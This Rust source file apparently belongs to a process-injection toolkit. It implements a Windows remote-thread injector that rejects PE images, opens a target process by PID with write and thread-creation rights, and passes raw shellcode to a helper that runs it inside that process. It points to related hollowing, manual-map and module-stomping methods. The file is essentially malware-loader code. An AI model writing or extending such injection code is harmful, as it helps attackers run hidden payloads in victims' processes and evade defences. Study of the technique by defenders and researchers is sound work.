use crate::injection::{payload_has_valid_pe_headers, Injector};
use anyhow::{anyhow, Result};

pub struct RemoteThreadInjector;

#[cfg(windows)]
impl Injector for RemoteThreadInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        // RemoteThread injects shellcode, not PE images.  PE payloads must use
        // Hollowing, ManualMap, or ModuleStomp (which forwards to hollowing).
        if payload_has_valid_pe_headers(payload) {
            return Err(anyhow!(
                "RemoteThread injection requires raw shellcode, not a PE image. \
                 Use InjectionMethod::Hollowing or InjectionMethod::ModuleStomp for PE payloads."
            ));
        }

        use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};
        let access_mask = PROCESS_VM_OPERATION
            | PROCESS_VM_WRITE
            | PROCESS_CREATE_THREAD
            | PROCESS_QUERY_INFORMATION;

        crate::injection::nt_create_thread_inject(pid, payload, access_mask, "RemoteThread")
    }
}

#[cfg(not(windows))]
impl Injector for RemoteThreadInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("RemoteThread injection only supported on Windows"))
    }
}
